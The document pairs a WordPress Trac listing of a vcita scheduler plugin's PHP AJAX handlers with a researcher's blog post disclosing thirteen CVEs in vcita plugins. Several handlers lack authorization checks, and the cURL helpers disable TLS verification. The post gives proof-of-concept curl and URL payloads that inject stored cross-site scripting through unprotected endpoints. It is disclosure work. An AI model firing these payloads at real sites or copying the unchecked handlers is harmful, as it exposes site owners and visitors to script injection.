* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from plugins.trac.wordpress.org_680ea56c_20250111_012715.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fmeeting-scheduler-by-vcita%2Ftrunk%2Fvcita-ajax-function.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?rev=3191356 "Revision 3191356")
* Next Revision →
* [Blame](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php)

---

# [source:](/browser?order=name "Go to repository root") [meeting-scheduler-by-vcita](/browser/meeting-scheduler-by-vcita?order=name "View meeting-scheduler-by-vcita")/[trunk](/browser/meeting-scheduler-by-vcita/trunk?order=name "View trunk")/[vcita-ajax-function.php](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?order=name "View vcita-ajax-function.php")

View diff against:

View revision:

| [Last change](/changeset/3200129/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php "View differences") on this file was [3200129](/changeset/3200129/ "View changeset 3200129"), checked in by vCita, [6 weeks ago](/timeline?from=2024-12-01T08%3A28%3A25Z&precision=second "See timeline at 12/01/2024 08:28:25 AM") |
| --- |
| security improvments |
| **File size:** 10.5 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) |  |
| [3](#L3) | add\_action( 'wp\_ajax\_vcita\_dismiss', 'vcita\_dismiss' ); |
| [4](#L4) | add\_action( 'wp\_ajax\_vcita\_logout', 'vcita\_logout\_callback' ); |
| [5](#L5) | add\_action( 'wp\_ajax\_vcita\_check\_auth', 'vcita\_check\_auth' ); |
| [6](#L6) | add\_action( 'wp\_ajax\_vcita\_save\_settings', 'vcita\_save\_settings\_callback' ); |
| [7](#L7) | add\_action( 'wp\_ajax\_vcita\_save\_data', 'vcita\_save\_user\_data\_callback' ); |
| [8](#L8) | add\_action( 'wp\_ajax\_vcita\_deactivate\_others', 'vcita\_vcita\_deactivate\_others\_callback' ); |
| [9](#L9) |  |
| [10](#L10) | function vcita\_dismiss() { |
| [11](#L11) |  |
| [12](#L12) | if ( isset( $\_GET[ 'dismiss' ] ) ) { |
| [13](#L13) | $wpshd\_vcita\_widget                   = (array) get\_option( WPSHD\_VCITA\_WIDGET\_KEY ); |
| [14](#L14) | $wpshd\_vcita\_widget[ 'dismiss' ]      = true; |
| [15](#L15) | $wpshd\_vcita\_widget[ 'dismiss\_time' ] = microtime( true ); |
| [16](#L16) | update\_option( WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget ); |
| [17](#L17) | echo 'dismissed'; |
| [18](#L18) | wp\_die(); |
| [19](#L19) | } |
| [20](#L20) | else if ( isset( $\_GET[ 'dismiss\_switch' ] ) ) { |
| [21](#L21) | $wpshd\_vcita\_widget                          = (array) get\_option( WPSHD\_VCITA\_WIDGET\_KEY ); |
| [22](#L22) | $wpshd\_vcita\_widget[ 'dismiss\_switch' ]      = true; |
| [23](#L23) | $wpshd\_vcita\_widget[ 'dismiss\_switch\_time' ] = microtime( true ); |
| [24](#L24) | update\_option( WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget ); |
| [25](#L25) | echo 'dismissed'; |
| [26](#L26) | wp\_die(); |
| [27](#L27) | } |
| [28](#L28) | else if ( isset( $\_GET[ 'switch\_on' ] ) ) { |
| [29](#L29) | $wpshd\_vcita\_widget                     = (array) get\_option( WPSHD\_VCITA\_WIDGET\_KEY ); |
| [30](#L30) | $wpshd\_vcita\_widget[ 'dismiss\_switch' ] = false; |
| [31](#L31) | unset( $wpshd\_vcita\_widget[ 'dismiss\_switch\_time' ] ); |
| [32](#L32) | $wpshd\_vcita\_widget[ 'show\_on\_site' ] = 1; |
| [33](#L33) | update\_option( WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget ); |
| [34](#L34) | echo 'dismissed'; |
| [35](#L35) | wp\_die(); |
| [36](#L36) | } |
| [37](#L37) |  |
| [38](#L38) | wp\_send\_json\_error( 'Invalid request', 400 ); |
| [39](#L39) | } |
| [40](#L40) |  |
| [41](#L41) | function vcita\_check\_auth() { |
| [42](#L42) | $wpshd\_vcita\_widget = (array) get\_option( WPSHD\_VCITA\_WIDGET\_KEY ); |
| [43](#L43) |  |
| [44](#L44) | wp\_send\_json( $wpshd\_vcita\_widget ); |
| [45](#L45) | } |
| [46](#L46) |  |
| [47](#L47) | function vcita\_vcita\_deactivate\_others\_callback() { |
| [48](#L48) | $av\_plugin\_list = wp\_cache\_get( 'WPSHD\_VCITA\_ANOTHER\_PLUGIN\_LIST' ); |
| [49](#L49) |  |
| [50](#L50) | if ( ! $av\_plugin\_list ) { |
| [51](#L51) | wp\_send\_json\_error( 'No plugins found', 404 ); |
| [52](#L52) | } |
| [53](#L53) |  |
| [54](#L54) | $found = array(); |
| [55](#L55) | foreach ( $av\_plugin\_list as $av\_plugin ) { |
| [56](#L56) | if ( isset( $av\_plugin[ 'file' ] ) ) { |
| [57](#L57) | $found[] = $av\_plugin[ 'file' ]; |
| [58](#L58) | } |
| [59](#L59) | } |
| [60](#L60) |  |
| [61](#L61) | if ( ! empty( $found ) ) { |
| [62](#L62) | deactivate\_plugins( $found ); |
| [63](#L63) | echo 'success'; |
| [64](#L64) | } |
| [65](#L65) | else { |
| [66](#L66) | wp\_send\_json\_error( 'No plugins to deactivate', 400 ); |
| [67](#L67) | } |
| [68](#L68) |  |
| [69](#L69) | wp\_die(); |
| [70](#L70) | } |
| [71](#L71) |  |
| [72](#L72) |  |
| [73](#L73) | function vcita\_logout\_callback() { |
| [74](#L74) | if ( current\_user\_can( 'delete\_plugins' ) ) { |
| [75](#L75) | $wpshd\_vcita\_widget              = wpshd\_vcita\_clean\_expert\_data(); |
| [76](#L76) | $wpshd\_vcita\_widget[ 'dismiss' ] = false; |
| [77](#L77) | unset( $wpshd\_vcita\_widget[ 'dismiss\_time' ] ); |
| [78](#L78) |  |
| [79](#L79) | if ( isset( $wpshd\_vcita\_widget[ 'wp\_id' ] ) && ! empty( $wpshd\_vcita\_widget[ 'wp\_id' ] ) ) { |
| [80](#L80) | $response = vcita\_send\_get( 'https://us-central1-scheduler-272415.cloudfunctions.net/scheduler-proxy/logout/' . sanitize\_text\_field( $wpshd\_vcita\_widget[ 'wp\_id' ] ) ); |
| [81](#L81) |  |
| [82](#L82) | if ( is\_wp\_error( $response ) ) { |
| [83](#L83) | wp\_send\_json\_error( 'Logout failed: ' . $response->get\_error\_message(), 500 ); |
| [84](#L84) | } |
| [85](#L85) | } |
| [86](#L86) |  |
| [87](#L87) | update\_option( WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget ); |
| [88](#L88) | wp\_send\_json\_success( 'Logged out successfully' ); |
| [89](#L89) | } |
| [90](#L90) | else { |
| [91](#L91) | wp\_send\_json\_error( 'Unauthorized', 403 ); |
| [92](#L92) | } |
| [93](#L93) |  |
| [94](#L94) | wp\_die(); |
| [95](#L95) | } |
| [96](#L96) |  |
| [97](#L97) |  |
| [98](#L98) | function vcita\_save\_user\_data\_callback() { |
| [99](#L99) | header('Content-Type: application/json'); |
| [100](#L100) | $response = array(); |
| [101](#L101) |  |
| [102](#L102) | // CSRF |
| [103](#L103) | if (!isset($\_REQUEST['nonce']) || !wp\_verify\_nonce($\_REQUEST['nonce'], 'wpshd\_vcita\_nonce\_action')) { |
| [104](#L104) | wp\_send\_json\_error('Invalid nonce'); |
| [105](#L105) | wp\_die(); |
| [106](#L106) | } |
| [107](#L107) |  |
| [108](#L108) | if (!current\_user\_can('manage\_options')) { |
| [109](#L109) | wp\_send\_json\_error('Insufficient permissions'); |
| [110](#L110) | wp\_die(); |
| [111](#L111) | } |
| [112](#L112) |  |
| [113](#L113) | if (isset($\_REQUEST['data\_name']) && isset($\_REQUEST['data\_val'])) { |
| [114](#L114) | $data\_name = sanitize\_key($\_REQUEST['data\_name']); |
| [115](#L115) | $data\_val  = sanitize\_text\_field($\_REQUEST['data\_val']); |
| [116](#L116) |  |
| [117](#L117) | $wpshd\_vcita\_widget = (array) get\_option(WPSHD\_VCITA\_WIDGET\_KEY); |
| [118](#L118) | $wpshd\_vcita\_widget[$data\_name] = $data\_val; |
| [119](#L119) |  |
| [120](#L120) | update\_option(WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget); |
| [121](#L121) |  |
| [122](#L122) | $response['success'] = true; |
| [123](#L123) | } else { |
| [124](#L124) | $response['error'] = 'Request invalid'; |
| [125](#L125) | } |
| [126](#L126) |  |
| [127](#L127) | // Возвращаем ответ |
| [128](#L128) | echo json\_encode($response); |
| [129](#L129) | wp\_die(); |
| [130](#L130) | } |
| [131](#L131) |  |
| [132](#L132) |  |
| [133](#L133) | function vcita\_save\_settings\_callback() { |
| [134](#L134) | header( 'Content-Type: application/json' ); |
| [135](#L135) | $response = array(); |
| [136](#L136) |  |
| [137](#L137) | // CSRF |
| [138](#L138) | if (!isset($\_POST['nonce']) || !wp\_verify\_nonce($\_POST['nonce'], 'wpshd\_vcita\_nonce\_action')) { |
| [139](#L139) | wp\_send\_json\_error('Invalid nonce'); |
| [140](#L140) | wp\_die(); |
| [141](#L141) | } |
| [142](#L142) |  |
| [143](#L143) | if ( isset( $\_POST[ 'btn\_text' ] ) || isset( $\_POST[ 'btn\_color' ] ) || isset( $\_POST[ 'txt\_color' ] ) || isset( $\_POST[ 'show\_on\_site' ] ) || isset( $\_POST[ 'widget\_title' ] ) || isset( $\_POST[ 'widget\_show' ] ) || isset( $\_POST[ 'widget\_text' ] ) || isset( $\_FILES[ 'widget\_img' ] ) || isset( $\_POST[ 'calendar\_page\_active' ] ) || isset( $\_POST[ 'contact\_page\_active' ] ) || isset( $\_POST[ 'hover\_color' ] ) || isset( $\_POST[ 'vcita\_design' ] ) ) { |
| [144](#L144) |  |
| [145](#L145) |  |
| [146](#L146) | $wpshd\_vcita\_widget = (array) get\_option( WPSHD\_VCITA\_WIDGET\_KEY ); |
| [147](#L147) |  |
| [148](#L148) |  |
| [149](#L149) | if ( isset( $\_POST[ 'show\_on\_site' ] ) ) { |
| [150](#L150) | $wpshd\_vcita\_widget[ 'show\_on\_site' ] = filter\_var( $\_POST[ 'show\_on\_site' ], FILTER\_VALIDATE\_INT ); |
| [151](#L151) | if ( $\_POST[ 'show\_on\_site' ] ) { |
| [152](#L152) | $wpshd\_vcita\_widget[ 'dismiss\_switch' ] = false; |
| [153](#L153) | unset( $wpshd\_vcita\_widget[ 'dismiss\_switch\_time' ] ); |
| [154](#L154) | } |
| [155](#L155) | } |
| [156](#L156) |  |
| [157](#L157) | if ( isset( $\_POST[ 'vcita\_design' ] ) ) { |
| [158](#L158) | $wpshd\_vcita\_widget[ 'vcita\_design' ] = filter\_var( $\_POST[ 'vcita\_design' ], FILTER\_VALIDATE\_INT ); |
| [159](#L159) | } |
| [160](#L160) |  |
| [161](#L161) |  |
| [162](#L162) | foreach ( |
| [163](#L163) | [ |
| [164](#L164) | 'btn\_text', |
| [165](#L165) | 'btn\_color', |
| [166](#L166) | 'txt\_color', |
| [167](#L167) | 'hover\_color', |
| [168](#L168) | 'widget\_title', |
| [169](#L169) | 'widget\_show', |
| [170](#L170) | 'widget\_text' |
| [171](#L171) | ] as $field |
| [172](#L172) | ) { |
| [173](#L173) | if ( isset( $\_POST[ $field ] ) ) { |
| [174](#L174) | $wpshd\_vcita\_widget[ $field ] = sanitize\_text\_field( $\_POST[ $field ] ); |
| [175](#L175) | } |
| [176](#L176) | } |
| [177](#L177) |  |
| [178](#L178) |  |
| [179](#L179) | if ( isset( $\_POST[ 'widget\_img\_clear' ] ) && $\_POST[ 'widget\_img\_clear' ] ) { |
| [180](#L180) | if ( ! empty( $wpshd\_vcita\_widget[ 'widget\_img' ] ) ) { |
| [181](#L181) | wp\_delete\_attachment( $wpshd\_vcita\_widget[ 'widget\_img' ], true ); |
| [182](#L182) | $wpshd\_vcita\_widget[ 'widget\_img' ] = ''; |
| [183](#L183) | } |
| [184](#L184) | } |
| [185](#L185) |  |
| [186](#L186) |  |
| [187](#L187) | foreach ( |
| [188](#L188) | [ |
| [189](#L189) | 'calendar\_page\_active' => 'wpshd\_vcita\_make\_sure\_calendar\_page\_published', |
| [190](#L190) | 'contact\_page\_active'  => 'wpshd\_vcita\_make\_sure\_page\_published' |
| [191](#L191) | ] as $page => $callback |
| [192](#L192) | ) { |
| [193](#L193) | if ( isset( $\_POST[ $page ] ) ) { |
| [194](#L194) | if ( $\_POST[ $page ] && $wpshd\_vcita\_widget[ 'uid' ] ) { |
| [195](#L195) | call\_user\_func( $callback, $wpshd\_vcita\_widget, true ); |
| [196](#L196) | $wpshd\_vcita\_widget[ $page ] = 1; |
| [197](#L197) | } |
| [198](#L198) | else { |
| [199](#L199) | call\_user\_func( 'wpshd\_vcita\_trash\_' . $page, $wpshd\_vcita\_widget ); |
| [200](#L200) | $wpshd\_vcita\_widget[ $page ] = 0; |
| [201](#L201) | } |
| [202](#L202) | } |
| [203](#L203) | } |
| [204](#L204) |  |
| [205](#L205) |  |
| [206](#L206) | function isFileImage( $mimeType ) { |
| [207](#L207) | return in\_array( $mimeType, [ 'image/jpeg', 'image/png', 'image/gif' ] ); |
| [208](#L208) | } |
| [209](#L209) |  |
| [210](#L210) | if ( isset( $\_FILES[ 'widget\_img' ] ) && $\_FILES[ 'widget\_img' ][ 'error' ] == UPLOAD\_ERR\_OK ) { |
| [211](#L211) |  |
| [212](#L212) | if ( ! current\_user\_can( 'upload\_files' ) ) { |
| [213](#L213) | $response[ 'error' ] = 'You do not have permission to upload files'; |
| [214](#L214) | echo json\_encode( $response ); |
| [215](#L215) | wp\_die(); |
| [216](#L216) | } |
| [217](#L217) |  |
| [218](#L218) | if ( ! isFileImage( $\_FILES[ 'widget\_img' ][ 'type' ] ) ) { |
| [219](#L219) | $response[ 'error' ] = 'Invalid file type; must be jpeg, png, or gif'; |
| [220](#L220) | echo json\_encode( $response ); |
| [221](#L221) | wp\_die(); |
| [222](#L222) | } |
| [223](#L223) |  |
| [224](#L224) |  |
| [225](#L225) | $wordpress\_upload\_dir = wp\_upload\_dir(); |
| [226](#L226) | $widget\_img           = $\_FILES[ 'widget\_img' ]; |
| [227](#L227) | $new\_file\_path        = $wordpress\_upload\_dir[ 'path' ] . '/' . $widget\_img[ 'name' ]; |
| [228](#L228) | $new\_file\_mime        = mime\_content\_type( $widget\_img[ 'tmp\_name' ] ); |
| [229](#L229) | $\_error               = false; |
| [230](#L230) |  |
| [231](#L231) |  |
| [232](#L232) | if ( empty( $widget\_img ) || $widget\_img[ 'error' ] || $widget\_img[ 'size' ] > wp\_max\_upload\_size() || ! in\_array( $new\_file\_mime, get\_allowed\_mime\_types() ) ) { |
| [233](#L233) | $\_error = true; |
| [234](#L234) | } |
| [235](#L235) |  |
| [236](#L236) |  |
| [237](#L237) | $i = 1; |
| [238](#L238) | while ( file\_exists( $new\_file\_path ) ) { |
| [239](#L239) | $i ++; |
| [240](#L240) | $new\_file\_path = $wordpress\_upload\_dir[ 'path' ] . '/' . $i . '\_' . $widget\_img[ 'name' ]; |
| [241](#L241) | } |
| [242](#L242) |  |
| [243](#L243) |  |
| [244](#L244) | if ( move\_uploaded\_file( $widget\_img[ 'tmp\_name' ], $new\_file\_path ) && ! $\_error ) { |
| [245](#L245) | $upload\_id = wp\_insert\_attachment( array( |
| [246](#L246) | 'guid'           => $new\_file\_path, |
| [247](#L247) | 'post\_mime\_type' => $new\_file\_mime, |
| [248](#L248) | 'post\_title'     => preg\_replace( '/\.[^.]+$/', '', $widget\_img[ 'name' ] ), |
| [249](#L249) | 'post\_content'   => '', |
| [250](#L250) | 'post\_status'    => 'inherit' |
| [251](#L251) | ), $new\_file\_path ); |
| [252](#L252) |  |
| [253](#L253) |  |
| [254](#L254) | require\_once( ABSPATH . 'wp-admin/includes/image.php' ); |
| [255](#L255) | wp\_update\_attachment\_metadata( $upload\_id, wp\_generate\_attachment\_metadata( $upload\_id, $new\_file\_path ) ); |
| [256](#L256) | $wpshd\_vcita\_widget[ 'widget\_img' ] = $upload\_id; |
| [257](#L257) | $response[ 'widget\_img' ]           = wp\_get\_attachment\_image( $upload\_id ); |
| [258](#L258) | } |
| [259](#L259) | } |
| [260](#L260) |  |
| [261](#L261) |  |
| [262](#L262) | if ( ! isset( $response[ 'error' ] ) ) { |
| [263](#L263) | $response[ 'success' ] = true; |
| [264](#L264) | } |
| [265](#L265) |  |
| [266](#L266) |  |
| [267](#L267) | update\_option( WPSHD\_VCITA\_WIDGET\_KEY, $wpshd\_vcita\_widget ); |
| [268](#L268) | } |
| [269](#L269) | else { |
| [270](#L270) | $response[ 'error' ] = 'Nothing to change'; |
| [271](#L271) | } |
| [272](#L272) |  |
| [273](#L273) | echo json\_encode( $response ); |
| [274](#L274) | wp\_die(); |
| [275](#L275) | } |
| [276](#L276) |  |
| [277](#L277) | function vcita\_send\_get($url, $options = array()) { |
| [278](#L278) | $ch = curl\_init(); |
| [279](#L279) |  |
| [280](#L280) | curl\_setopt($ch, CURLOPT\_URL, $url); |
| [281](#L281) | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, 0); |
| [282](#L282) | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, 0); |
| [283](#L283) | curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1); |
| [284](#L284) |  |
| [285](#L285) | $output = curl\_exec($ch); |
| [286](#L286) | $error = curl\_error($ch); |
| [287](#L287) | $httpcode = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE); |
| [288](#L288) | curl\_close($ch); |
| [289](#L289) |  |
| [290](#L290) | if (empty($error) && $httpcode === 200) { |
| [291](#L291) | return json\_decode($output, true); |
| [292](#L292) | } elseif (empty($error) && $httpcode !== 200) { |
| [293](#L293) | return array( |
| [294](#L294) | 'error'       => $output, |
| [295](#L295) | 'description' => 'Request was not successful', |
| [296](#L296) | 'http\_code'   => $httpcode, |
| [297](#L297) | ); |
| [298](#L298) | } else { |
| [299](#L299) | return array( |
| [300](#L300) | 'error'       => $error, |
| [301](#L301) | 'description' => 'Request was not successful', |
| [302](#L302) | ); |
| [303](#L303) | } |
| [304](#L304) | } |
| [305](#L305) |  |
| [306](#L306) |  |
| [307](#L307) | function vcita\_send\_post($url, $options = array()) { |
| [308](#L308) | $ch = curl\_init(); |
| [309](#L309) |  |
| [310](#L310) | curl\_setopt($ch, CURLOPT\_URL, $url); |
| [311](#L311) | curl\_setopt($ch, CURLOPT\_POST, 1); |
| [312](#L312) | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, 0); |
| [313](#L313) | curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, 0); |
| [314](#L314) | curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1); |
| [315](#L315) |  |
| [316](#L316) |  |
| [317](#L317) | if (!empty($options['post\_data'])) { |
| [318](#L318) | curl\_setopt($ch, CURLOPT\_POSTFIELDS, $options['post\_data']); |
| [319](#L319) | } |
| [320](#L320) |  |
| [321](#L321) |  |
| [322](#L322) | $output = curl\_exec($ch); |
| [323](#L323) | $error = curl\_error($ch); |
| [324](#L324) | $httpcode = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE); |
| [325](#L325) | curl\_close($ch); |
| [326](#L326) |  |
| [327](#L327) |  |
| [328](#L328) | if (empty($error) && $httpcode === 200) { |
| [329](#L329) | return json\_decode($output, true); |
| [330](#L330) | } elseif (empty($error) && $httpcode !== 200) { |
| [331](#L331) | return array( |
| [332](#L332) | 'error'       => $output, |
| [333](#L333) | 'description' => 'Request was not successful', |
| [334](#L334) | 'status'      => $httpcode, |
| [335](#L335) | ); |
| [336](#L336) | } else { |
| [337](#L337) | return array( |
| [338](#L338) | 'error'       => $error, |
| [339](#L339) | 'description' => 'Request was not successful', |
| [340](#L340) | 'status'      => $httpcode, |
| [341](#L341) | ); |
| [342](#L342) | } |
| [343](#L343) | } |
| [344](#L344) |  |
| [345](#L345) |  |
| [346](#L346) | ?> |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php?format=txt)
* [Original Format](/export/3220505/meeting-scheduler-by-vcita/trunk/vcita-ajax-function.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from blog.jonh.eu_7d6401d3_20250111_012713.html ===


[Jonas' Blog](https://blog.jonh.eu)

# Security Vulnerabilities in WordPress Plugins by vcita

On 02/02/2023 I discovered several security vulnerabilities in the WordPress plugins by vcita and reached out to the company according to responsible disclosure principles. The company issued updates to fix the vulnerabilities on June 12.

The following CVEs have been assigned to the security vulnerabilities:

1. **[CVE-2023-2298](https://www.cve.org/CVERecord?id=CVE-2023-2298)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Unauthenticated Stored Cross-Site Scripting

2. **[CVE-2023-2299](https://www.cve.org/CVERecord?id=CVE-2023-2299)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization on REST-API

3. **[CVE-2023-2300](https://www.cve.org/CVERecord?id=CVE-2023-2300)** – Contact Form Builder by vcita <= 4.9.1 – Authenticated (Contributor+) Stored Cross-Site Scripting

4. **[CVE-2023-2301](https://www.cve.org/CVERecord?id=CVE-2023-2301)** – Contact Form Builder by vcita <= 4.9.1 – Cross-Site Request Forgery to Stored Cross-Site Scripting

5. **[CVE-2023-2302](https://www.cve.org/CVERecord?id=CVE-2023-2302)** – Contact Form and Calls To Action by vcita <= 2.6.4 – Authenticated (Contributor+) Stored Cross-Site Scripting

6. **[CVE-2023-2303](https://www.cve.org/CVERecord?id=CVE-2023-2303)** – Contact Form and Calls To Action by vcita <= 2.6.4 – Cross-Site Request Forgery to Stored Cross-Site Scripting

7. **[CVE-2023-2404](https://www.cve.org/CVERecord?id=CVE-2023-2404)** – CRM and Lead Management by vcita <= 2.6.2 – Authenticated (Contributor+) Stored Cross-Site Scripting

8. **[CVE-2023-2405](https://www.cve.org/CVERecord?id=CVE-2023-2405)** – CRM and Lead Management by vcita <= 2.6.2 – Cross-Site Request Forgery to Stored Cross-Site Scripting

9. **[CVE-2023-2406](https://www.cve.org/CVERecord?id=CVE-2023-2406)** – Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 – Authenticated (Contributor+) Stored Cross-Site Scripting

10. **[CVE-2023-2407](https://www.cve.org/CVERecord?id=CVE-2023-2407)** – Event Registration Calendar By vcita <= 1.3.1 & Online Payments – Get Paid with PayPal, Square & Stripe <= 3.9.1 – Cross-Site Request Forgery to Stored Cross-Site Scripting

11. **[CVE-2023-2414](https://www.cve.org/CVERecord?id=CVE-2023-2414)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization to Settings Update and Media Upload

12. **[CVE-2023-2415](https://www.cve.org/CVERecord?id=CVE-2023-2415)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Missing Authorization to Account Logout

13. **[CVE-2023-2416](https://www.cve.org/CVERecord?id=CVE-2023-2416)** – Online Booking & Scheduling Calendar for WordPress by vcita <= 4.2.10 – Cross-Site Request Forgery to Account Logout

**Online Booking & Scheduling Calendar for WordPress by vcita (4.1 – 4.2.10)**Stored Cross Site Scripting, Missing Authentication
3000+ active installs, ~ 400.000 downloads
The plugin uses an unprotected REST route endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
1. Attacker sends the following curl request to a website that uses the vcita widget. The request updates the `uid` & `business\_id` & `business\_name` & `email` variables in the database:
   “`curl
   curl –request POST \
   –url <https://example.com/wp-json/vcita-wordpress/v1/actions/auth> \
   –header ‘Content-Type: application/json’ \
   –data ‘{
       “success”: true,
       “user\_data”: {
           “business\_id”: “\”; alert(1); //”,
           “business\_name”: “Evil Eve”,
           “email”: [“[email protected]”](/cdn-cgi/l/email-protection#e3869586a386958a8fcd808c8e)
       }
   }’
   “`
2. The injected alert(1) is executed on the live website

**Contact Form Builder by vcita (<= 4.9.1)**
2000+ active installs, ~ 360.000 downloads
The plugin does not validate $\_GET parameters and stores them directly in the database. These values are later inserted into the page without sanitation. This endpoint also does not have sufficient access control since all users with the edit\_posts capability can open it.

Proof of Concept
1. Case A: If the attacker has edit\_posts capability on the target website, he opens the following URL: [example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first\_name=a-a&last\_name=b&title=c&confirmation\_token=d&confirmed=true&engage\_delay=1&implementation\_key=1&email=a](http://example.com/wp-admin/admin.php?page=live-site-parse-vcita-callback&success=true&uid=a&first_name=a&last_name=b&title=c&confirmation_token=d&confirmed=true&engage_delay=1&implementation_key=1&email=a)“/><script>alert(1);</script>`
Case B: If the attacker does not have the edit\_posts capability he tricks an user that does have this capability into opening the URL
2. The email field `a”/><script>alert(1);</script>` is stored in the database
3. When an admin opens the plugin’s settings page (`wp-admin/admin.php?page=live-site`) the alert is triggered.

**Contact Form and Calls To Action by vcita (<= 2.6.4)**
400+ active installs, ~ 135.000 downloadsThe plugin adds a poorly protected endpoint to set the connection parameters for the vcita account connection. The variables are stored in the database without any validation and are later inserted into the website without any sanitation.

Proof of Concept
